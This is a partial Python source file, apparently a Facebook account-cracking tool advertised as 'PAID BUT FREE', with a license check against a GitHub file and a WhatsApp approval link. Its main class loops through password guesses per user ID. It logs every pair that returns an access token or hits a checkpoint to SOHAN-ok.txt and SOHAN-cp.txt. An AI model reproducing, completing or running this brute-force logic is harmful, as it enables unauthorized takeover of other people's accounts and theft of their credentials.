...
\033[1;32m║ \033[1;36m𝚅𝙴𝚁𝚂𝙸𝙾𝙽\033[1;31m•━━━━✥\033[1;31m:0.0.0                        \033[1;32m║
...
def reg():
   ...
   # os.system('xdg-open https://www.facebook.com/bk4human')
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/Devil-S1X4N/test/blob/main/aprv.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
       ...
       # os.system('xdg-open https://www.facebook.com/bk4human')
        ...
        os.system('am start https://wa.me/+966595246369?text=' + tks)
        reg()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : SOHAN AHMED SIXAN");time.sleep (0.03)
    print("             [*]. WHATSWAPP   : +966595246369");time.sleep (0.03)
    print("             [*]. GITHUB     : Devil-S1X4N-1236");time.sleep (0.03)   
    print("             [*]. VERSION    : 1.0.9");time.sleep (0.03)
    print("             [*]. TOOL TYPE  : PAID BUT FREE");time.sleep (0.03)
    print("             [*]. IP ADDRESS : [%s]\n"%(IP));time.sleep(0.01)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [SOHAN] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [SOHAN-OK] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('SOHAN-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[SOHAN-CP] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SOHAN-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
